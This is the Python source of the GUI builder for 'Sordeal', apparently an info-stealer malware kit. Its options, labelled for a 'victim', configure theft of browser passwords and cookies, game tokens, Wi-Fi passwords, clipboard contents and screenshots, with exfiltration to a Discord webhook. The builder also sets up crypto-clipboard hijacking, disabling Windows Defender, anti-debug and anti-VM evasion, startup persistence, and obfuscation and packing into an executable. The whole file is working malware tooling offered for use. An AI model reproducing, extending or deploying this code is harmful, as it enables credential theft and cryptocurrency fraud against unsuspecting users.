import customtkinter
from customtkinter import filedialog as fd
import os
from PIL import Image
import requests
import time
import shutil
import webbrowser
import win32gui
import win32con
import base64

#############################################################################################################################
############################################ Clean@Builder: v2 ##############################################################
############################################ Clean@Author: https://github.com/NolayDsc ######################################
############################################ Clean@Code: For Sordeal ########################################################
#############################################################################################################################

class Sordeal(customtkinter.CTk):
    def __init__(self):
        self.icon_name = ""
        self.pingtype = "none"
        
        self.iconname = "Sordeal_assets\img\sordeal.ico"
        super().__init__()

        #title, icon
        self.title("Sordeal - Builder")
        self.geometry("840x600")
        self.iconbitmap("Sordeal_assets\img\logo.ico")

        #base
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)

        #path img
        image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "Sordeal_assets\img")
        self.logo = customtkinter.CTkImage(Image.open(os.path.join(image_path, "logo.png")), size=(60, 60))
        self.gif = customtkinter.CTkImage(Image.open(os.path.join(image_path, "sordeal.png")), size=(300, 300))
        self.options = customtkinter.CTkImage(light_image=Image.open(os.path.join(image_path, "l_options.png")), dark_image=Image.open(os.path.join(image_path, "d_options.png")), size=(20, 20))
        self.crypto = customtkinter.CTkImage(light_image=Image.open(os.path.join(image_path, "l_crypto.png")), dark_image=Image.open(os.path.join(image_path, "d_crypto.png")), size=(20, 20))
        self.files = customtkinter.CTkImage(light_image=Image.open(os.path.join(image_path, "l_files.png")), dark_image=Image.open(os.path.join(image_path, "d_files.png")), size=(20, 20))
        self.build_img = customtkinter.CTkImage(light_image=Image.open(os.path.join(image_path, "l_build.png")),dark_image=Image.open(os.path.join(image_path, "d_build.png")), size=(20, 20))
        self.about = customtkinter.CTkImage(light_image=Image.open(os.path.join(image_path, "l_about.png")), dark_image=Image.open(os.path.join(image_path, "d_about.png")), size=(20, 20))


        #List Frame
        self.options_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.options_frame.grid_columnconfigure(0, weight=1)

        self.nav_frame = customtkinter.CTkFrame(self, corner_radius=0)
        self.nav_frame.grid(row=0, column=0, sticky="nsew")

        self.crypto_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.crypto_frame.grid_columnconfigure(0, weight=1)

        self.build_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.build_frame.grid_columnconfigure(0, weight=1)

        self.file_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.file_frame.grid_columnconfigure(0, weight=1)

        self.about_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.about_frame.grid_columnconfigure(0, weight=1)

        #Nav Bar
        self.nav_frame.grid_rowconfigure(6, weight=1)
        self.nav_label = customtkinter.CTkLabel(self.nav_frame, text="", image=self.logo, compound="left", font=customtkinter.CTkFont(size=60, weight="bold"))
        self.nav_label.grid(row=0, column=0, padx=20, pady=20)

        self.option_button = customtkinter.CTkButton(self.nav_frame, corner_radius=0, height=40, border_spacing=10, text="Options", fg_color="transparent", text_color=("gray10", "gray90"), hover_color="#ff0026", image=self.options, anchor="w", command=self.option_event)
        self.option_button.grid(row=1, pady=20, column=0, sticky="ew")

        self.crypto_button = customtkinter.CTkButton(self.nav_frame, corner_radius=0, height=40, border_spacing=10, text="Crypto", fg_color="transparent", text_color=("gray10", "gray90"), hover_color="#ff0026", image=self.crypto, anchor="w", command=self.crypto_event)
        self.crypto_button.grid(row=2, pady=20, column=0, sticky="ew")

        self.file_button = customtkinter.CTkButton(self.nav_frame, corner_radius=0, height=40, border_spacing=10, text="File", fg_color="transparent", text_color=("gray10", "gray90"), hover_color="#ff0026", image=self.files, anchor="w", command=self.file_event)
        self.file_button.grid(row=3, pady=20, column=0, sticky="ew")

        self.build_button = customtkinter.CTkButton(self.nav_frame, corner_radius=0, height=40,border_spacing=10, text="Build", fg_color="transparent",text_color=("gray10", "gray90"), hover_color="#ff0026",image=self.build_img, anchor="w", command=self.build_event)
        self.build_button.grid(row=4, pady=20, column=0, sticky="ew")

        self.about_button = customtkinter.CTkButton(self.nav_frame, corner_radius=0, height=40,border_spacing=10, text="About", fg_color="transparent",text_color=("gray10", "gray90"), hover_color="#ff0026",image=self.about, anchor="w",command=self.about_event)
        self.about_button.grid(row=5, pady=20, column=0, sticky="ew")

        self.app = customtkinter.CTkComboBox(self.nav_frame, width=120, height=30, values=["Dark", "Light"],command=self.change_app)
        self.app.grid(row=6, column=0, pady=20)


        #Options category
        self.w3bh00k_name = customtkinter.CTkLabel(master=self.options_frame, text="Webhook")
        self.w3bh00k_name.grid(row=1, column=0, columnspan=2, padx=10, pady=(10, 0))

        self.w3bh00k_input = customtkinter.CTkEntry(self.options_frame, width=420, placeholder_text="Enter your webhook")
        self.w3bh00k_input.grid(row=2, column=0, columnspan=2, padx=40, pady=(0, 12))

        self.w3bh00k_button = customtkinter.CTkButton(self.options_frame, width=120, height=30, fg_color=("gray75", "gray25"), hover_color="#ff0026", text="Check Webhook", command=self.c_button, compound="right")
        self.w3bh00k_button.grid(row=2, column=2, padx=40, pady=(0, 12))

        self.n3m3_name = customtkinter.CTkLabel(master=self.options_frame, text="File Name")
        self.n3m3_name.grid(row=3, column=0, columnspan=2, padx=10, pady=(5, 0))

        self.n3m3_input = customtkinter.CTkEntry(self.options_frame, width=420, placeholder_text="Enter your file output name")
        self.n3m3_input.grid(row=4, column=0, columnspan=2, padx=40, pady=(0, 12))

        self.icon_button = customtkinter.CTkButton(self.options_frame, width=120, height=30,fg_color=("gray75", "gray25"), hover_color="#ff0026",text="Add Icon (.ico)", command=self.icon, compound="right")
        self.icon_button.grid(row=5, column=2, padx=40, pady=12)

        self.icon_check = customtkinter.CTkCheckBox(self.options_frame, text="Add icon on your exe [.ico only]",fg_color=("gray75", "gray25"), hover_color="#ff0026", onvalue="yes",offvalue="no")
        self.icon_check.grid(row=5, column=0, sticky="nw", padx=40, pady=12)

        self.kill = customtkinter.CTkCheckBox(self.options_frame, text="Kill victim Discord Client", fg_color=("gray75", "gray25"), hover_color="#ff0026", onvalue=True, offvalue=False)
        self.kill.grid(row=6, column=0, sticky="nw", padx=40, pady=12)

        self.dbug = customtkinter.CTkCheckBox(self.options_frame, text="Enable Anti-Debug \n[Recommand yes, Kill Anti-Virus/Anti-Firewall/Anti-VM]?",fg_color=("gray75", "gray25"), hover_color="#ff0026", onvalue=True, offvalue=False)
        self.dbug.grid(row=7, column=0, sticky="nw", padx=40, pady=12)

        self.ping_new = customtkinter.CTkCheckBox(self.options_frame,text="Ping on new victim? (here/everyone)",fg_color=("gray75", "gray25"), hover_color="#ff0026",command=self.pings, onvalue="yes", offvalue="no")
        self.ping_new.grid(row=8, column=0, sticky="nw", padx=40, pady=12)

        self.ping_option = customtkinter.CTkComboBox(self.options_frame, width=120, height=30, values=["here", "everyone"])
        self.ping_option.grid(row=8, column=2, sticky="nw", padx=40, pady=12)

        self.wd = customtkinter.CTkCheckBox(self.options_frame, text="Disable Windows Defender \n(Can create error/detection Recommand \"no active\")",fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.wd.grid(row=9, column=0, sticky="nw", padx=40, pady=12)

        self.fake_err = customtkinter.CTkCheckBox(self.options_frame,text="Add a fake error",fg_color=("gray75", "gray25"), hover_color="#ff0026", onvalue='yes', offvalue='no')
        self.fake_err.grid(row=10, column=0, sticky="nw", padx=40, pady=12)

        self.startups = customtkinter.CTkCheckBox(self.options_frame, text="Add file to startup",fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.startups.grid(row=11, column=0, sticky="nw", padx=40, pady=12)

        self.hide = customtkinter.CTkCheckBox(self.options_frame, text="Hide SOrdeal console for victim",fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.hide.grid(row=12, column=0, sticky="nw", padx=40, pady=12)

        self.next_option_button = customtkinter.CTkButton(self.options_frame, width=120, height=30,fg_color=("gray75", "gray25"), hover_color="#ff0026",text="Next", command=self.crypto_event, compound="right")
        self.next_option_button.grid(row=12, column=2, padx=40, pady=12)


        #Crypto category
        crypto_names = ["Bitcoin", "Ethereum", "X-Chain", "P-Chain", "C-Chain", "Monero", "Ada/Cardano", "Dash"]

        for i, name in enumerate(crypto_names):
            crypto_label = customtkinter.CTkLabel(master=self.crypto_frame, text=name)
            crypto_label.grid(row=2 * i + 2, column=0, columnspan=2, padx=10, pady=0)

        self.active = customtkinter.CTkCheckBox(self.crypto_frame, text="Replace all copied crypto address wallet by your address",fg_color=("gray75", "gray25"), hover_color="#ff0026", onvalue='yes', offvalue='no')
        self.active.grid(row=1, column=0, sticky="nw", padx=40, pady=10)

        self.btc_input = customtkinter.CTkEntry(self.crypto_frame, width=420,placeholder_text="Your Bitcoin Address (let empty if you do not have)")
        self.btc_input.grid(row=3, column=0, columnspan=2, padx=40, pady=(0, 10))

        self.eth_input = customtkinter.CTkEntry(self.crypto_frame, width=420,placeholder_text="Your Ethereum Address (let empty if you do not have)")
        self.eth_input.grid(row=5, column=0, columnspan=2, padx=40, pady=(0, 10))

        self.xchain_input = customtkinter.CTkEntry(self.crypto_frame, width=420,placeholder_text="Your X-Chain Address (let empty if you do not have)")
        self.xchain_input.grid(row=7, column=0, columnspan=2, padx=40, pady=(0, 10))

        self.pchain_input = customtkinter.CTkEntry(self.crypto_frame, width=420,placeholder_text="Your P-Chain Address (let empty if you do not have)")
        self.pchain_input.grid(row=9, column=0, columnspan=2, padx=40, pady=(0, 10))

        self.cchain_input = customtkinter.CTkEntry(self.crypto_frame, width=420,placeholder_text="Your C-Chain Address (let empty if you do not have)")
        self.cchain_input.grid(row=11, column=0, columnspan=2, padx=40, pady=(0, 10))

        self.monero_input = customtkinter.CTkEntry(self.crypto_frame, width=420,placeholder_text="Your Monero Address (let empty if you do not have)")
        self.monero_input.grid(row=13, column=0, columnspan=2, padx=40, pady=(0, 10))

        self.ada_input = customtkinter.CTkEntry(self.crypto_frame, width=420,placeholder_text="Your Ada/Cardano Address (let empty if you do not have)")
        self.ada_input.grid(row=15, column=0, columnspan=2, padx=40, pady=(0, 10))

        self.dash_input = customtkinter.CTkEntry(self.crypto_frame, width=420,placeholder_text="Your Dash Address (let empty if you do not have)")
        self.dash_input.grid(row=17, column=0, columnspan=2, padx=40, pady=(0, 10))

        self.next_crypto_button = customtkinter.CTkButton(self.crypto_frame, width=120, height=30,fg_color=("gray75", "gray25"), hover_color="#ff0026",text="Next", command=self.file_event, compound="right")
        self.next_crypto_button.grid(row=17, column=2, padx=40, pady=0)


        #File category
        self.browsers_button = customtkinter.CTkCheckBox(self.file_frame,text="Steal Browsers Files (Cookies/Password/etc...)",fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.browsers_button.grid(row=1, column=0, sticky="nw", padx=40, pady=20)

        self.antivirus_button = customtkinter.CTkCheckBox(self.file_frame,text="Steal all anti virus informations",fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.antivirus_button.grid(row=2, column=0, sticky="nw", padx=40, pady=20)

        self.mc_button = customtkinter.CTkCheckBox(self.file_frame, text="Steal all minecraft app tokens",fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.mc_button.grid(row=3, column=0, sticky="nw", padx=40, pady=20)

        self.sys_button = customtkinter.CTkCheckBox(self.file_frame, text="Steal systeme informations",fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.sys_button.grid(row=4, column=0, sticky="nw", padx=40, pady=20)

        self.roblox_button = customtkinter.CTkCheckBox(self.file_frame, text="Steal roblox app token",fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.roblox_button.grid(row=5, column=0, sticky="nw", padx=40, pady=20)

        self.screen_button = customtkinter.CTkCheckBox(self.file_frame, text="Take screenshot",fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.screen_button.grid(row=6, column=0, sticky="nw", padx=40, pady=20)

        self.last_button = customtkinter.CTkCheckBox(self.file_frame, text="Steal latest clipboard",fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.last_button.grid(row=7, column=0, sticky="nw", padx=40, pady=20)

        self.wifi_button = customtkinter.CTkCheckBox(self.file_frame, text="Steal all wifi passwords",fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.wifi_button.grid(row=8, column=0, sticky="nw", padx=40, pady=20)

        self.next_file_button = customtkinter.CTkButton(self.file_frame, width=120, height=30,fg_color=("gray75", "gray25"), hover_color="#ff0026",text="Next", command=self.build_event, compound="right")
        self.next_file_button.grid(row=9, column=2, padx=40, pady=20)

        #Select button defaut
        for button in [self.browsers_button, self.antivirus_button, self.mc_button, self.sys_button, self.roblox_button, self.screen_button, self.last_button, self.wifi_button]:
            button.select()


        #Build category
        self.obf = customtkinter.CTkCheckBox(self.build_frame, text="Obfuscate the SOrdeal",fg_color=("gray75", "gray25"), hover_color="#ff0026", onvalue='yes', offvalue='no')
        self.obf.grid(row=1, column=0, sticky="nw", padx=40, pady=20)

        self.compy = customtkinter.CTkCheckBox(self.build_frame,text="Compil into .exe (Let Empty for .py)",fg_color=("gray75", "gray25"), hover_color="#ff0026", onvalue='yes', offvalue='no')
        self.compy.grid(row=2, column=0, sticky="nw", padx=40, pady=20)

        self.obf_name = customtkinter.CTkLabel(master=self.build_frame, text="Obfuscation Level")
        self.obf_name.grid(row=3, column=0, columnspan=2, padx=10, pady=(20, 5))

        self.num = customtkinter.CTkLabel(master=self.build_frame, text='          0%                                             25%                                          50%                                          75%                                          100%')
        self.num.grid(row=4, column=0, columnspan=1, padx=10, pady=0, sticky="nw")

        self.obf_bar = customtkinter.CTkSlider(self.build_frame, from_=0, to=1, number_of_steps=4)
        self.obf_bar.grid(row=5, column=0, sticky="ew", padx=40, pady=(0,20))

        self.pleasebuild = customtkinter.CTkButton(self.build_frame, width=150, height=50,fg_color=("gray75", "gray25"), hover_color="#ff0026", text="BUILD SCRIPT", command=lambda: self.build_scr(self.n3m3_input.get(), self.w3bh00k_input.get()), compound="right")
        self.pleasebuild.grid(row=6, column=0, padx=0, pady=20)

        #About category
        self.img = customtkinter.CTkLabel(self.about_frame, text="", image=self.gif, compound="left",font=customtkinter.CTkFont(size=16, weight="bold"))
        self.img.grid(row=0, column=0, pady=20)

        urls = [("Github", "https://github.com/SOrdeal/Sordeal-Stealer"),
                   ("Discord", "https://discord.gg/sordeal"),
                   ("Telegram", "https://t.me/+ELXYl6x1r-E0MzE0")]

        for i, (text, url) in enumerate(urls, start=3):
            button = customtkinter.CTkButton(self.about_frame, text=text, fg_color=("gray75", "gray25"),hover_color="#ff0026", command=lambda url=url: webbrowser.open(url))
            button.grid(row=i, column=0, pady=10)

        self.function("options")

    # Nav bar
    def function(self, name):
        buttons = [self.option_button, self.crypto_button, self.file_button, self.build_button, self.about_button]

        for button in buttons:
            button_name = button.cget("text").lower()
            button.configure(fg_color=("gray75", "gray25") if button_name == name else "transparent")

        frames = {
            "options": self.options_frame,
            "crypto": self.crypto_frame,
            "file": self.file_frame,
            "build": self.build_frame,
            "about": self.about_frame
        }

        for button_name, frame in frames.items():
            if button_name == name:
                frame.grid(row=0, column=1, sticky="nsew")
            else:
                frame.grid_forget()

    def change_app(self, new_app: str):
        customtkinter.set_appearance_mode(new_app)

    #Options category
    def r_icon(self):
        self.icon_button.configure(fg_color=("gray75", "gray25"), hover_color="#ff0026", text="Add Icon (.ico)")

    def icon(self):
        self.icon_name = fd.askopenfilename()
        self.name_icon = os.path.basename(self.icon_name)
        if os.path.isfile(f"{self.icon_name}"):
            self.icon_button.configure(width=120, height=30, fg_color="green", hover_color=("gray75", "gray25"),text=f"{self.name_icon}")
            self.options_frame.after(3500, self.r_icon)
            pass
        else:
            self.icon_button.configure(width=120, height=30, fg_color="red", hover_color=("gray75", "gray25"),text="Invalid directory")
            self.options_frame.after(3500, self.r_icon)
        if self.icon_name.endswith('.ico'):
            pass
        else:
            self.icon_button.configure(width=120, height=30, fg_color="red", hover_color=("gray75", "gray25"),text="Invalid extention")
            self.options_frame.after(3500, self.r_icon)

    def v_w3bh00k(self):
        webhook = self.w3bh00k_input.get()
        try:
            r = requests.get(webhook, timeout=5)
            if r.status_code == 200:
                return True
            else:
                return False
        except requests.exceptions.RequestException:
            return False

    def c_button(self):
        if self.v_w3bh00k():
            self.w3bh00k_button.configure(width=120, height=30, fg_color="green", hover_color=("gray75", "gray25"), text="Valid Webhook")
            self.options_frame.after(3500, self.r_button)
        else:
            self.w3bh00k_button.configure(width=120, height=30, fg_color="red", hover_color=("gray75", "gray25"), text="Invalid Webhook")
            self.options_frame.after(3500, self.r_button)

    def r_button(self):
        self.w3bh00k_button.configure(fg_color=("gray75", "gray25"), hover_color="#ff0026", text="Check Webhook")

    def pings(self):
        if self.ping_new.get() == "yes":
            self.ping = "yes"
            self.pingtype = self.ping_option.get()
        else:
            self.ping = "no"
            self.pingtype = "none"

    #Nav Bar
    def option_event(self):
        self.function("options")

    def crypto_event(self):
        self.function("crypto")

    def build_event(self):
        self.function("build")

    def file_event(self):
        self.function("file")

    def about_event(self):
        self.function("about")

##BUILDER USING
    def reset_build(self):
        self.pleasebuild.configure(fg_color=("gray75", "gray25"), text="BUILD SCRIPT")

    def build_scr(self, filename, webhook):
        self.pleasebuild.configure(width=150, height=50, fg_color="green", hover_color=("gray75", "gray25"),text="Build currently starting")
        self.options_frame.after(5000, self.reset_build)
        self.mk_file(filename, webhook)
        self.cleanup(filename)
        self.renamefile(filename)

    def mk_file(self, filename,webhook):
        with open('./main.py', 'r', encoding="utf-8") as f:
            code = f.read()

        inputs = {
            'btc_input': 'btc_', 'eth_input': 'eth_',
            'xchain_input': 'xchain_', 'pchain_input': 'pchain_', 'cchain_input': 'cchain_',
            'monero_input': 'monero_',
            'ada_input': 'ada_',
            'dash_input': 'dash_'
        }

        for key, value in inputs.items():
            setattr(self, value, self.__dict__[key].get() if len(self.__dict__[key].get()) > 0 else 'none')

        if self.active.get() != "yes":
            inputs = {
                'btc_': '', 'eth_': '',
                'xchain_': '', 'pchain_': '', 'cchain_': '',
                'monero_': '',
                'ada_': '',
                'dash_': ''
            }

            for key, value in inputs.items():
                setattr(self, key, value)

        b64 = webhook.encode('utf-8')
        bs64 = base64.b64encode(b64)
        with open(f"{filename}.py", "w", encoding="utf-8") as f:
            f.write(code.replace('%WEBHOOK_HERE%', str(bs64).replace("b'", "").replace("'", ""))
                    .replace("%ping_enabled%", str(self.ping_new.get()))
                    .replace("%Defender_disable%", str(self.wd.get()))
                    .replace("%ping_type%", self.pingtype)
                    .replace("%_address_replacer%", str(self.active.get()))
                    .replace("%_btc_address%", self.btc_)
                    .replace("%_eth_address%", self.eth_)
                    .replace("%_xchain_address%", self.xchain_)
                    .replace("%_pchain_address%", self.pchain_)
                    .replace("%_cchain_address%", self.cchain_)
                    .replace("%_monero_address%", self.monero_)
                    .replace("%_ada_address%", self.ada_)
                    .replace("%_dash_address%", self.dash_)
                    .replace("%_error_enabled%", str(self.fake_err.get()))
                    .replace("%_startup_enabled%", str(self.startups.get()))
                    .replace("%_hide_script%", str(self.hide.get()))
                    .replace("'%kill_discord_process%'", str(self.kill.get()))
                    .replace("'%_debugkiller%'", str(self.dbug.get()))
                    .replace("%_browsers_files%", str(self.browsers_button.get()))
                    .replace("%_av_files%", str(self.antivirus_button.get()))
                    .replace("%minecraft_files%", str(self.mc_button.get()))
                    .replace("%_systeme_files%", str(self.sys_button.get()))
                    .replace("%_roblox_files%", str(self.roblox_button.get()))
                    .replace("%_clipboard_files%", str(self.last_button.get()))
                    .replace("%_screen_files%", str(self.screen_button.get()))
                    .replace("%wifipassword_files%", str(self.wifi_button.get())))

        time.sleep(2)
        if self.obf.get() == 'yes' and self.compy.get() == 'yes':
            self.encryption(f"{filename}")
            self.compile(f"obfuscated_{filename}")
        elif self.obf.get() == 'no' and self.compy.get() == 'yes':
            self.compile(f"{filename}")
        elif self.obf.get() == 'yes' and self.compy.get() == 'no':
            self.encryption(f"{filename}")
        else:
            pass

    def encryption(self, filename):
        os.system(f"python obfuscation.py -i {filename}.py -o obfuscated_{filename}.py -s {self.obf_bar.get() * 100}".replace(".0", ""))

    def compile(self, filename):
        icon_name = self.icon_name if self.icon_name else self.iconname
        icon = icon_name if self.icon_check.get() == 'yes' else "NONE"
        if self.hide.get() == "yes":
            os.system(f'python -m PyInstaller --onefile --noconsole --upx-dir=./Sordeal_assets/upx -i {icon} --distpath ./ .\\{filename}.py')
        if self.hide.get() == "no":
            os.system(f'python -m PyInstaller --onefile --upx-dir=./Sordeal_assets/upx -i {icon} --distpath ./ .\\{filename}.py')

    def cleanup(self, filename):
        cleans_dir = {'./__pycache__', './build'}
        cleans_file = {f'./{filename}.py',f'./{filename}.spec',f'./obfuscated_compressed_{filename}.py',f'./obfuscated_{filename}.py',f'./obfuscated_{filename}.spec',f'./compressed_{filename}.py',f'./compressed_{filename}.spec'}

        if self.obf.get() == 'yes' and self.compy.get() == 'no':
            cleans_file.add(f'./{filename}.py')
            cleans_file.remove(f'./obfuscated_{filename}.py')
        elif self.obf.get() == 'yes' and self.compy.get() == 'yes':
            cleans_file.add(f'./{filename}.py')
            cleans_file.add(f'./obfuscated_{filename}.spec')
        elif self.obf.get() == 'no' and self.compy.get() == 'no':
            cleans_file.remove(f'./{filename}.py')
        else:
            pass

        for clean in cleans_dir:
            try:
                if os.path.isdir(clean):
                    shutil.rmtree(clean)
            except Exception:
                pass
                continue

        for clean in cleans_file:
            try:
                if os.path.isfile(clean):
                    os.remove(clean)
            except Exception:
                pass
                continue

    def renamefile(self, filename):
        files = [f"./obfuscated_compressed_{filename}.py", f"./compressed_{filename}.py",
                 f"./compressed_{filename}.exe", f"./obfuscated_{filename}.py",
                 f"./obfuscated_compressed_{filename}.exe", f"./obfuscated_{filename}.exe"]
        for file in files:
            try:
                os.rename(file, f"./{filename}{os.path.splitext(file)[1]}")
            except Exception:
                pass

if __name__ == "__main__":
    hide = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hide, win32con.SW_HIDE)
    app = Sordeal()
    app.mainloop()